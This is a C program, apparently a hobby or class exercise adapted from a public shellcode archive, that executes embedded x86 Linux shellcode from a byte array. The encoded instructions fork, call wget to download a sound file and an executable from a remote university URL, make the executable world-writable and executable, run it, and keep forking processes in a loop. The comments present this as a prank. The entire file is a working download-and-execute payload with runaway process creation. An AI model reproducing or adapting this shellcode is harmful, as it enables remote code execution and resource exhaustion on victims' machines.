//This shellcode is adapted from: http://repo.shell-storm.org/shellcode/files/shellcode-611.php

#include <stdio.h>
#include <string.h>

int main(void)
{
        char SC[346] = "\x6a\x02\x58\xcd\x80" //First part is "download sound part"
                       "\x66\x85\xc0\x74\x5e" //Switch between "download parts" and file handling/playing parts at bottom
                       "\x6a\x02\x58\xcd\x80" //Switch between first part & second part for subprocessing...
                       "\x66\x85\xc0\x74\x57"
                       "\x6a\x0b\x58\x99\x52"
		       "\x68\x2e\x77\x61\x76"
                       "\x68\x65\x70\x65\x72"
                       "\x68\x2f\x63\x72\x65"
                       "\x68\x6c\x61\x72\x61"
                       "\x68\x7e\x64\x61\x6c"
                       "\x68\x65\x64\x75\x2f"
                       "\x68\x75\x6e\x63\x2e"
                       "\x68\x2e\x63\x73\x2e"
                       "\x68\x77\x77\x77\x78"
		       "\x89\xe1\x52\x6a\x74"
		       "\x68\x2f\x77\x67\x65"
		       "\x68\x2f\x62\x69\x6e"
		       "\x68\x2f\x75\x73\x72"
		       "\x89\xe3\x52\x51\x53"
		       "\x89\xe1\xcd\x80"
                       "\x33\xc0\x40\xcd\x80" //Exit for first part just in case...
                       "\xeb\x5a" //Bridge gap from top to bottom...
                       "\x90" //Padding to deal w/subprocess jump from beginning to second part
                       "\x6a\x0b\x58\x99\x52" //Second part is "download executable file part"
                       "\x68\x6e\x6e\x65\x72" //End of URL
		       "\x68\x72\x5f\x72\x75"
                       "\x68\x65\x65\x70\x65" 
                       "\x68\x2f\x2f\x63\x72"
                       "\x68\x6c\x61\x72\x61"
                       "\x68\x7e\x64\x61\x6c"
                       "\x68\x65\x64\x75\x2f"
                       "\x68\x75\x6e\x63\x2e"
                       "\x68\x2e\x63\x73\x2e"
                       "\x68\x77\x77\x77\x78" //Beginning of URL
		       "\x89\xe1\x52\x6a\x74"
		       "\x68\x2f\x77\x67\x65"
		       "\x68\x2f\x62\x69\x6e"
		       "\x68\x2f\x75\x73\x72"
		       "\x89\xe3\x52\x51\x53"
		       "\x89\xe1\xcd\x80"
                       "\x33\xc0\x40\xcd\x80" //Exit for second part just in case...
                       "\x6a\x01\x6a\x1e\x89\xe3\x31\xc9\xb8\xa3\x10\x01\x80\x05\xff\xef"
                       "\xfe\x7f\xcd\x80" //End of "wait part"
                       "\x31\xc9\x51\x66\xb9\xff\x01\x68\x6e\x6e\x65\x72\x68\x72\x5f\x72"
		       "\x75\x68\x65\x65\x70\x65\x68\x2e\x2f\x63\x72\x89\xe3\x6a\x0f\x58"
                       "\xcd\x80" //End of "change permissions" part
                       "\x6a\x02\x58\xcd\x80"
                       "\x66\x85\xc0\x74\x02" //Fork more subprocesses that jump ahead & play creeper sound repeatedly at same time!
                       "\xeb\x2d"
                       "\x6a\x01\x6a\x01\x89\xe3\x31\xc9\xb8\xa3\x10\x01\x80\x05\xff\xef"
                       "\xfe\x7f\xcd\x80" //Wait a few seconds before playing sound to make shellcode more entertaining
                       "\xeb\xde\x90\x90" //Jump back to keep perpetuating forks
                       "\x5b\x31\xc0\x88\x43\x10\x89\x5b\x14\x89\x43"
	               "\x18\x8d\x4b\x14\x31\xd2\xb0\x0b\xcd\x80"
                       "\xe8\xe6\xff\xff\xff"
                       "\x2e\x2f\x63\x72\x65\x65\x70\x65\x72\x5f\x72\x75\x6e" //Data related to execution itself
                       "\x6e\x65\x72\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
                       "\x20\x20\x20\x20\x20\x20\x20\x00"; //End of "Play part"

       	fprintf(stdout,"Length: %d\n",strlen(SC));
	(*(void(*)()) SC)();
     
        return 0;
}
